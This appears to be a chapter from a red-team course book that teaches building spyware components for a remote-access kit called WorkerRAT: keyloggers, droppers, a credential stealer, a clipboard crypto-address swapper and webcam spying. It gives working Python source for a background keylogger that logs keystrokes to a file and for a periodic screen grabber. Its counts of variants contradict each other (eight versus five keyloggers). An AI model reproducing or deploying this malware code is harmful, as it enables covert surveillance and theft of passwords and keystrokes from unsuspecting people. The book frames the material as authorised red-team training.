# Standalone Potentially Unwanted Programs (PUPs)

Within the RTCB, you will learn how to create a series of standalone PUPs, using Python and some external libraries. You will also learn how to refactor them into the **WorkerRAT** exploit kit, which is a collection of PUPs that can be remotely controlled by a command-and-control (C2) server. PUPs are programs that perform unwanted or malicious actions on the target system or network, such as logging keystrokes, stealing credentials, dropping malware, or exfiltrating data. PUPs are often disguised as legitimate or useful software, or bundled with other programs, to trick the user into installing or running them. PUPs can also be delivered through phishing emails, drive-by downloads, or exploit kits, which take advantage of vulnerabilities in the target system or application.

As you progress through the RTCB you will incorporate your own selection of PUPs into your iteration of WorkerRAT, and the corresponding components for the Mothership Command Server.

## Examples of the PUPs and C2s that you will create working through the RTCB are:

**1) Keyloggers:** 
    
    - A program that records the keystrokes of the user and saves them to a file or sends them to a C2. You will create eight variations of this PUP, using different methods to capture the keyboard input. Four of them will be in Python, using the pynput, keyboard, pyHook, and ctypes modules. The other four will be in C, using the Windows API, the X11 API, the ncurses library, and the libpcap library.
**2) Droppers:** 
    
    - A program that downloads and executes another program from a remote source, such as a URL or a C2. You will create four variations of this PUP, using different methods to download and execute the payload. Two of them will be in Python, using the requests, urllib, subprocess, and os modules. The other two will be in C, using the libcurl library, the WinINet API, the system function, and the CreateProcess function.

**3) A Stealer:** 
    
    - A program that steals sensitive information from the target system, such as tokens, passwords, databases, or files. You will create one variation of this PUP in Python, using the sqlite3, shutil, win32crypt, and pywin32 modules to access and extract the information.

**4) Tools for Network and System Fingerprinting:** 
    
    - A program that collects information about the target system, such as the operating system, hardware, network, processes, or users. You will create one variation of this PUP in Python, using the os, platform, psutil, socket, requests, and getpass modules to gather and report the information.

**5) A Clipper / Crypto-jacker:** 
    
    - A family of programs that monitors the clipboard of the user and replaces any copied text with a predefined text, such as a malicious URL or a cryptocurrency address. You will create two variations of this PUP, using different methods to access and manipulate the clipboard. One of them will be in Python, using the pyperclip module. The other one will be in C, using the GetClipboardData and SetClipboardData functions on Windows, or the XGetSelectionOwner and XSetSelectionOwner functions on Linux.

**6) A Screen Grabber:** 
    
    - A program that captures the screen of the user and saves it to a file or sends it to a C2. You will create one variation of this PUP in Python, using the PIL and io modules to capture and encode the screen image.

**7) Webcam and Microphone Streaming Tools:** 

    - A program that streams the webcam and microphone of the user to a C2, to spy on the user’s activities and surroundings. You will create one variation of this PUP in Python, using the cv2, pyaudio, and socket modules to access and stream the webcam and microphone data. 

By the end of this section, you will have a solid foundation in systems programming for potentially unwanted reasons, and a powerful arsenal of PUPs and C2s that you can use for your red-team exercises. You will also learn how to test, debug, and deploy your PUPs and C2s, using the virtual lab you set up in Part 1. Remember, the goal of this book is to teach you how to develop a robust toolset for legitimate and ethical red-teaming, to emulate real-world threat actors and improve the security of your systems and networks. Do not use these PUPs and C2s for any illegal or malicious purposes, as you may face serious legal consequences. Always obtain the proper authorization and consent before conducting any red-team exercise, and follow the ethical hacking principles and guidelines. Happy hacking!

# Sample PUPs

## First, Set up a Virtual Environments to Test your PUPs

Before you start developing your own potentially unwanted programs (PUPs), you need to set up a safe and isolated environment where you can test them without affecting your main system or network. The RTCB suggests creating **virtual environments** specifc to the packages required for each PUP to simplify compiling with Nuitka. Venvs are self-contained directories that contain a Python installation and any packages you need for your project. Virtual environments allow you to create and switch between multiple Python environments, each with its own dependencies and settings. This way, you can avoid conflicts between different versions of packages or libraries, and keep your system clean and secure.
To create a virtual environment, you need the **venv** module, which is included in the standard library of Python 3. You can use the following command to create a new virtual environment in the specified directory:

```bash
python -m venv /path/to/new/virtual/environment
```

This command will create the directory if it doesn't exist already, and place a **pyvenv.cfg** file in it with a **home** key pointing to the Python installation from which the command was run. A common name for the directory is **.venv**. The command will also create a **bin** (or **Scripts** on Windows) subdirectory containing a copy or symlink of the Python binary or binaries, depending on the platform or arguments used at environment creation time. Additionally, it will create an (initially empty) **lib/pythonX.Y/site-packages** subdirectory (on Windows, this is **Lib\site-packages**), where X and Y are the major and minor version numbers of Python.


**To activate the virtual environment, you need to run the following command:**

```bash
source ./venv/bin/activate
```

This will change your prompt to show that you are in the virtual environment, and modify the **PATH** environment variable to include the bin directory of the virtual environment. This way, you can use the Python interpreter and any packages installed in the virtual environment without specifying the full path. To deactivate the virtual environment, you can simply type **deactivate**.

Pip is typically out of date in a new venv. To update pip use:

```bash
pip install --upgrade pip
```

Now that you have set up your virtual environment, you are ready to start developing your own PUPs.

---


# **Keyloggers 1/5: Capturing Keyboard Input with pynput**

Create & activate a new virtual environment and install the necessary library for this PUP with:

```bash
pip install pynput
```

The **pynput** module allows you to control and listen to the keyboard and mouse events in Python. In this section, you will learn how to use this module to create a simple keylogger program. A keylogger can be useful for various purposes, such as logging, monitoring, or testing. In this chapter we will develop 5 different Keyloggers to cover the different methods that APTs use.

To write the keylogger program, you will require the **queue**, **threading**, and **pynput** modules. The queue module provides a way to store and retrieve items in a first-in, first-out (FIFO) order, and also manages thread locking for you. The threading module provides a way to run a function in a separate thread of execution. The pynput module provides a way to listen to the keyboard events and call a function for each key press.

---

## **The code for the keylogger program is shown below:**

```python
import queue
import threading
from pynput import keyboard


def worker():
    key_string = ''
    while True:
        key = q.get()
        try:
            key_string += str(key.char)
        except AttributeError:
            if key == key.space:
                key_string += ' '
            elif key == key.backspace:
                key_string = key_string[:-1]
            elif key == key.shift:
                pass
            elif key == key.enter:
                key_string += '\\n'
            elif key == key.alt:
                pass
            elif key == key.tab:
                pass
            elif key == key.ctrl:
                pass
            else:
                key_string += str(key)

        if len(key_string) >= 20:
            with open('logfile.txt', 'a') as f:
                f.write(key_string)
            key_string = ''

        q.task_done()


def on_press(key):
    q.put(key)


q = queue.Queue()  # 1) Create a Queue object
t = threading.Thread(target=worker)  # 2) Initialize the worker function in a separate Thread
t.start()  
listener = keyboard.Listener(on_press=on_press)  # 3) Initialize the Pynput Listener object
listener.start()
```

---

## **The keylogger program works as follows:**

1) It creates a queue object that will store the key events.
2) It creates a thread object that will run a worker function in the background. The worker function will get the key events from the queue, convert them to strings, and append them to a key_string variable. It will also handle some special keys, such as space, backspace, enter, and shift, by adding the appropriate characters to the key_string. If the key_string reaches a certain length (20 in this example), it will open a file named logfile.txt in append mode and write the key_string to it. Then, it will reset the key_string to an empty string.
3) It creates a keyboard listener object that will monitor the keyboard events and call an on_press function for each key press. The on_press function will simply put the key event into the queue.


That's all there is to the pynput module! The queue and threading stuff may seem complicated compared to the open()/write()/close() workflow you've been using to write text files, but it's to ensure that the pynput module doesn't block the main thread while listening to the keyboard events. You can learn more about the pynput module from https://pynput.readthedocs.io/.

# Python Screen Grabber: Capturing Screen Shots with PIL

Create & activate a new virtual environment and install the necessary library for this PUP with:

```bash
pip install Pillow
```

The Pillow module is a fork of the PIL (Python Imaging Library) module, which provides various image processing functions in Python. In this section, you will learn how to use this module to create a simple screenshot program. A screenshot program can be useful for various purposes, such as spying, monitoring, or testing. In this chapter we will develop 5 different screenshot programs to cover the different methods that APTs use.

To write the screenshot program, you will require the ImageGrab, threading, sys, and time modules. The ImageGrab module provides a way to capture the screen image and return it as an Image object. The threading module provides a way to run a function in a separate thread of execution. The sys module provides a way to exit the program gracefully. The time module provides a way to format the current time and sleep for a certain duration.
The code for the screenshot program is shown below:


```python
from PIL import ImageGrab
from threading import Thread
from sys import exit
import time


def take_screenshot():
    while True:
        print('taking screenshot')
        image = ImageGrab.grab()
        now = time.strftime("%Y-%m-%d_%H-%M-%S")
        filename = f'screenshot_{now}.png'
        image.save(filename)
        time.sleep(10)


def exit_program():
    input('Press ENTER to exit\n')
    exit(0)


if __name__ == '__main__':
    t1 = Thread(target=take_screenshot)  # 1) Initialize the take_screenshot function in a separate Thread
    t1.start()
    t2 = Thread(target=exit_program)  # 2) Initialize the exit_program function in another separate Thread
    t2.start()
```

## The Screen Grabber works as follows:

1) It creates a thread object that will run a take_screenshot function in the background. The take_screenshot function will loop indefinitely and do the following steps:
   - Print a message indicating that it is taking a screenshot.
   - Use the ImageGrab.grab() function to capture the screen image and return it as an Image object.
   - Use the time.strftime() function to format the current time as a string with the format “%Y-%m-%d_%H-%M-%S”.
   - Use the f-string syntax to create a filename with the prefix “screenshot_” and the current time as the suffix.
   - Use the image.save() method to save the Image object as a PNG file with the filename.
   - Use the time.sleep() function to pause the execution for 10 seconds.
2) It creates another thread object that will run an exit_program function in the background. The exit_program function will do the following steps:
   - Use the input() function to prompt the user to press ENTER to exit the program.
   - Use the sys.exit() function to terminate the program.

That’s all there is to the Pillow module! You can learn more about the Pillow module from https://pillow.readthedocs.io/.

---
